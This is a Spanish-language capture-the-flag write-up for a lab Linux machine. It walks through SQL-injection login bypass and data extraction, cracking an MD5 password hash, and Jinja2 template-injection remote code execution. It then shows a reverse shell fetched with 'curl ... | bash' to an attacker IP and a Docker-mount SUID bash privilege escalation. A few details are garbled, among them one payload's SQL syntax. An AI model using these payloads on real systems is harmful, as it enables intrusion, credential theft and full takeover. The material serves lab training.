## Summary

Tags: #Contenedor #BurpSuite #John #Fuzzing #SSTI #SQLI  #Montura #PortScan #Root  #Linux 

- IP -> 10.10.11.130
- Ports -> TCP (80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 80 -> Apache httpd 2.4.51 

## Paginas de ayuda
* PayloadAllTheThings: [PayloasAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Recon
```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p80 ❮Target IP❯ -oN targeted
```

Utilizamos este comando cuando solo existe el puerto 80 en una maquina.
```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen
```
Pero no reporta nada

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 

	# I = i mayuscula
	# s = silence
```
Pero en esta ocasion tampoco enconntramos algo relevante

Ahora buscamos dentro de la web y mirando con Wappalyzer encontramos que esta corriendo como 'Servidor Web' **Flask 2.0.2** y como Lenguaje **Python 3.9.2** Por lo que podriamos decir que se podria acontecer un **SSTI (Server Site Template Injection)**

Despues hacemos Fuzzing, para ver si existen mas directorios.
```bash 
❯ wfuzz -c --hc=404 -hh=9265 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.130/FUZZ
```
Y descubrimos algunos directiorios como los siguientes:  (profile, blog, signup, login, logout)
El que nos sirvio es el 'signup' ya que ahi tenemos otra pagina en donde nos podemos registrar.

Usando esta inyeccion, logramos burlar el panel y entramos como admin.
```bash
❯ ' or 1=1-- -                                       # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
```
Existe un panel de configuracion, el cual no abre al principio, porque en la url esta tratando de hacer **Virtual Hosting (internal-administration.goodgames.htb)** por lo que debemos de agregar la ruta a nuestro **/etc/hosts** 

Usamos **BurpSuite** para ver si podemos usar en el mismo campo de login para poder inyectar comandos SQLI.
```bash
❯ ' or 1=1-- -                                       # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
❯ ' order by 100-- -                                 # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
```
Encontramos que ya no nos marca error en la 4ta columna, ademas de fijarnos en el Content-Length, que cuando tiene error tiene un numero y cuando no, tiene otro numero.

```bash
❯ ' union select 1,2,3,4 -- -                        # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo, y este se encuentra a lado del 'Welcome'
```
Despues podemos  ir inyectando diferentes cosas para ir viendo el output en la respuesta de BurpSuite

```bash
❯ ' union select 1,2,3,"test" -- -              # Nos muestra en el output de la web la palabra 'test'
❯ ' union select 1,2,3,"{{7*7}}" -- -           # Si en la respuesta miramos un 49, quiere decir que existe un SSTI (Server Site Template Injection)
❯ ' union select 1,2,3,database() -- -          # Queremos que muestre el nombre de la base de datos actual en uso
```

Para saber las bases de datos (DB) existentes.
```bash 
❯ ' union select 1,2,3,schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
```

Para saber las tablas de la base de datos (DB) especifica. Lo limitamos ya que en la respuesta junta todas las tablas y no se aprecia bien.
```bash
❯ ' union select 1,2,3,table_name from information_schema.tables limit 0,1-- -             # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
```

Para poder ver mejor las tablas, tendremos que hacerlo en la consola de la siguiente manera:
* Miramos que la peticion en BurpSuite es por POST
```bash
❯ curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union 1,2,3,select table_name from information_schema.tables limit 0,1-- -&password=1111"

	# data = Que es lo que queremos enviar a nivel de data
```

Ahora vamos a automatizar el comando para que nos muestre todas las tablas:
```bash
❯ for i in $(seq 0 100); do echo "[+] El numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=1111" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done

	# data = Que es lo que queremos enviar a nivel de data
	# for = Ir iterando en el $i
	# main = La base de datos actual
	
```

Ahora vamos a automatizar el comando para que nos muestre todas las columnas:
```bash
❯ for i in $(seq 0 100); do echo "[+] El numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,column_name from information_schema.columns where table_schema=\"main\" and table_name=\"user\" limit $i,1-- -&password=1111" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done

	# data = Que es lo que queremos enviar a nivel de data
	# for = Ir iterando en el $i
	# main = La base de datos actual
	# user = tabla de la DB
	# \ = Para escapar las comillas de user y main y asi no nos de un error al mandar la data por comando
```

Ahora podemos extraer los datos de las columnas (user, passwd)
```bash
❯ for i in $(seq 0 100); do echo "[+] El numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user limit $i,1-- -&password=1111" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done

	# 0x3a = ':' en Hexadecimal
```
Nos devuelve un usuario, su email y una passwerd encritada

Para saber que tipo de **Hash** tiene la passwd, hacemos lo siguiente:
```bash
❯ hash-identifier                           # Abriremos la tool y desoues colocaremos el hash a encontrar
	2b22337f218b2d82dfc3b6f77e7cb8ec

	# MD5 = Tiene 32 caracteres
```
Nos damos cuenta que es un MD2

Para poder desencriptar el has usamos la tool **John the Ripper**
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt Hash                 # Usamos John para crackear un hash con fuerza bruta

	# wordlist = Ruta del diccionario rockyou.txt
	# Hash = Archivo que contiene el hash a crackear
```

En caso de que marque error porque detecta muchos tipos de hash, debemos de especificarle uno. En este caso es MD5.
```bash
❯ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt <Hashfile>            # Crackear un hash con un formato especifico

	# format = raw-md5 -> Formato especifico del hash (MD4,MD5, SHA1...)
	# raw = Tipo de hash estandar (raw-md5, raw-sha1, raw-sha256, whirlpool...)
	# hashfile = Archivo que contiene el hash a crackear
```
Nos devuelve la passwd : **superadministrator**

Regresando a la pagina en donde se encuentra el login **(internal-administration.goodgames.htb)** podemos colocar el usuario y password y asi entramos.
En la pagina volvemos a buscar un **SSTI** ya que el **Wapalizer** nos reporta que la pagina tiene como 'Servidor Web' **Flask 2.0.2** y como Lenguaje **Python 3.6.7** 
* Vamos a settings y en el campo **Full name** podemos agregar un usuario, despues de agregarlo nos sale el nombre del usuario en el output de la web. Por lo que intentamos colocar **{{7\*7}}** y si nos regresa un **49** es vulnerable al SSTI (Y si lo es)

Buscamos la pagina 'PayloadAllTheThings' y dentro colocamos:
* **Server Site Template Injection  >  Python - Jinja2  >  Remote Code Execution** 

Con este comando podriamos ver el **id** en el output de la web. Este se coloca en la parte de **Full name** en Settings
```bash 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
Miramos el id en el output de la web.

Por lo que ahora podemos hacer ejecucion remota de comandos. Hacemos una revershell a nuestra maquina de atacante 
Con este comando podriamos ver el **hostname -I** en el output de la web. Este se coloca en la parte de **Full name** en Settings
```bash 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('hostname -I').read() }}
```
Miramos que estamos en la IP: **127.19.0.2** por lo que estariamos dentro de un **contenedor docker.**

Debemos de validar si el contenedor puede mandar trazas a nuestra maquina
```bash
❯ tcpdump -i tun0 icmp -n                   # Nos ponemos en escucha en la interfaz i = Tun0 para trazas ICMP, n = No DNS
```

Con este comando podriamos hacer **ping** desde el contenedor hacia nuestra maquina victima. Este se coloca en la parte de **Full name** en Settings
```bash 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ping -c 1 10.10.14.2').read() }}
```
Tenemos conexion a nuestra maquina. 

## User
Ahora si podemos hacer una ReverShell a nuestra maquina de atacante
Creamos un archivo .html en nuestra maquina de atacante
```bash
❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar
```

Compartiremos el index.html
```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80
```

```bash
❯ nc -nlvp 443                              # Nos ponemos en escucha por el puert 443
```

Con este comando podriamos hacer **curl** que se interpretara con bash a nuestra IP desde el contenedor hacia nuestra maquina victima. Este se coloca en la parte de **Full name** en Settings
```bash 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.14.2 | bash').read() }}
```
Ganamos acceso a la maquina pero al contenedor.

Tratamiento de la pseudo-consola
```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

```bash
❯ whoami                                     # Miramos el nombre del usuario
```

```bash
❯ hostname -I                                # Nos muestra solo la direccion IP
```

Este comando es para ver la tabla de ruteo y mirar que existe en el contenedor la IP -> 127.19.0.1
```bash
❯ route -n                                   # Para mirar las routing tables
```

```bash
❯ ifconfig docker0                           # Miramos la IP de la interfaz de Docker
```

Buscamos la flag del usuario user.txt en el /home 


* Para saber si estamos en una montura, miramos lo siguiente:
```bash
❯ grep 'augustus' /etc/passwd                # Observamos si existe ese usuario, pero en esta ocasion no existe, pero si tenemos directorio personal de ese usuario
```

Si al user.txt le hacemos un **ls -l** observamos lo siguiente:
```bash
-rw-r----- 1 root 1000 33 feb 21 18:45 user.txt  # Le ponen grupo 1000 porque como ese usuario no existe, estan haciendo una montura y el directorio /home de la maquina real me lo esten montando en ese contenedor
```

```bash 
❯ cat /etc/group                             # Miramos los grupos y su identificador, pero no encontramos el 1000
```

```bash
❯ mount | grep home                          # Nos muestra desde donde hasta donde esta creada esa montura
```

Nos dirigimos al directorio **/tmp/** ya que ahi tenemos capacidad de lectura y escritura
Si **Vi y Nano** no estan disponibles en la maquina, podemos hacer el siguiente script para enumerar puertos abiertos. Este script lo hacemos en nuestra maquina de atacante y luego lo codificamos en base64 para poderlo pasar a la maquina victima, colo copiando el codigo.
```bash
❯ nano PortScan.sh                          # Enviamos una cadena vacia para saber si el puerto esta abierto o no
	#!/bin/bash

	funtion ctrl_c(){
		echo -e "\n\n[!] Saliendo...\n"
		tput cnorm; exit 1
	}

	# Ctrl + c
	trap ctrl_c INT 

	tput civis
	for port in $(seq 1 65535); do 
		timeout 1 bash -c "echo '' > /dev/tcp/127.19.0.1/$port" 2>/dev/null && echo "[+] Puerto $port - OPEN" &
	done; wait 
	tput cnorm

	# Si el codigo de estado es exitoso (0), quiere decir que el puerto esta 'abierto'
	# timeout = Asignamos un tiempo de vida maximo de 1 seg para que no se quede en un bucle
	# civis = Para no ver el cursor
	# cnorm = Cuando acabe el bucle, recuperemos el cursor
```
Le damos permisos de ejecusion con chmod +x

Codificamos el codigo anterior en base64
```bash
❯ base64 -w 0 PortScan.sh | xclip -set clip             # Codificamos el contenido de PortScan en base64 y lo copiamos en la clipboard
```

Ahora en la maquina victima lo decodeamos de la siguiente manera:
```bash
❯ echo kiufgaiuafgajlfufa98ag676a85g6ga7 | base64 -d > PortScan.sh  # Decodeamos y lo colocamos en un archivo que se llamara PortScan.sh
```
Le damos permisos de ejecusion con chmod +x y lo ejecutamos con ./PortScan.sh

Descubrimos que el puerto 22 esta abierto en ese contenedor. Por lo que usaremos ssh con el usuario august y la passwd que ya teniamos de admin. Como es una montura tiene la misma passwd.

```bash
❯  ssh augustus@172.19.0.1                                    # Para conectarnos por ssh en el puerto default 22
```
Ahora estamos dentro de la maquina real victima.

```bash
❯ ip a                                                        # Para ver las interfaces e IPs de una maquina
```

## Root

Una vez dentro de la maquina victima podemos observar que no somos el usuario root ya que si nos dirigimos a **/root/** nos sale que no tenemos acceso, por lo que ahora debemos buscar como escalar privilegios.

```bash
❯ uname -a                                         # Miramos informacion del Kernel
```

```bash
❯ lsb_release -a                                   # Miramos algunas caracteristicas de la maquina Linux 
```

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
	# (root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
```

```bash 
❯ find / -perm -4000 -ls 2>/dev/null                   # Buscaremos por privilegios SUID

	# ls = Miramos los privilegios y buscamos los de root
```
No encontramos nada

```bash
❯ echo $PATH                              # Nos damos cuenta que tiene un PATH muy pequeno, por lo que vamos a copiar el nuestro a la maquina victima y asi poder extenderlo

❯ export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin   # Faltan mas PATH pero es para hacer el ejemplo
```

```bash
❯ which getcap                             # Para ver si esta instalado el Getcap y mirar las capabilities
```

```bash
❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins](https://gtfobins.github.io/)

	# Tipos de capabilires:
	# cap_setuid=ep = Nos permite setear el UID y hacer que opere como root
```
Pero no nos ayuda de nada


* Para hacer la escalada debemos de recordar que cuando estabamos en el contenedor eramos el usuario root. Por lo que debemos de copiarnos la bash de Augustus y lo que hagamos se vera reflejado en el contenedor, ya que es una montura.
```bash
❯ cp /bin/bash .                           # Copiamos la bash en el dir actual de augustus
❯ exit                                     # Despues nos salimos de la interfaz ssh 172.19.0.1, por lo que regresaremos al contenedor 172.19.0.2
```

```bash
❯ cd /home/augustus/                       # Nos dirigimos al directorio montado
❯ ls -l                                    # Ahi veremos tanto la bash como el user.txt y miramos los privilegios de los archivos
```

```bash
❯ chown root:root bash                     # Le asignamos de propietario y grupo 'root' a la bash
```

```bash
❯ chmod 4755 bash                          # Le cambiamos los privilegios SUID y ahora tendra una 's'
```

Despues regresamos a la maquina original con ssh
```bash
❯ ssh augustus@172.19.0.1                  # Regresamos a la interfaz de la maquina'real' 
```

Una vez adentro colocamos nos montamos la bash con el siguiente comando
```bash
❯ ./bash -p                                # Y asi obtenemos la bash del root

	# p = privilege
```

```bash
❯ whoami                                   # Para verificar si estamos como root
```

Buscamos la flag en el **/root/root.txt**

